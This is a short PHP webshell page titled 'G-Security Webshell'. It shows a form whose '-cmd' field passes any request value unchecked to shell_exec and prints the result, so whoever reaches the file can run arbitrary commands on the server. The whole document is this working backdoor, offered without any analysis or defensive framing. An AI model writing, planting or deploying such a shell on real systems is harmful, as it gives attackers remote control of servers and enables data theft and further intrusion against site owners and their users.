<html>
<head>
<title>G-Security Webshell</title>
</head>

<body bgcolor=#000000 text=#ffffff ">
<form method=POST>
<br>
<input type=TEXT name="-cmd" size=64 value="<?=$cmd?>" 
style="background:#000000;color:#ffffff;">
<hr>
<pre>
<? $cmd = $_REQUEST["-cmd"];?>
<? if($cmd != "") print Shell_Exec($cmd);?>
</pre>
</form>
</body>
</html
